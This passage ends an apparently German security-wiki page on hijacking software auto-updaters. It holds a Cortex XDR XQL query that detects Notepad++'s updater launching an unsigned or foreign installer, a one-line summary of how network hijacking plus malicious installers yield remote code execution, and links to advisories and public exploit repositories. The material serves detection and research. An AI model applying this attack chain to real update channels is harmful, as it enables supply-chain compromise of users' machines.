<summary>Cortex XDR XQL – <code>gup.exe</code> startet ein nicht zu Notepad++ gehörendes Installationsprogramm</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Diese Muster lassen sich auf jeden Updater verallgemeinern, der unsignierte Manifeste akzeptiert oder die Signer der Installationsprogramme nicht fest bindet: Netzwerk-Hijacking + schädliches Installationsprogramm + BYO-signiertes Sideloading ermöglichen die Remote Code Execution unter dem Deckmantel „vertrauenswürdiger“ Updates.

---
## Referenzen
- [1] [Advisory – Netskope Client for Windows – lokale Privilegieneskalation über Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre und Razer Synapse 4 pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – lokale Privilegieneskalation über beschreibbare Dateien im Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilegieneskalation im Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Akteure auf staatlicher Ebene nutzen die Notepad++-Supply-Chain aus](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – Update zum Vorfall mit kompromittierter Infrastruktur](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Umgehung des Fixes für CVE-2025-0309 im Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Aufdeckung von Privilegieneskalationsfehlern in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
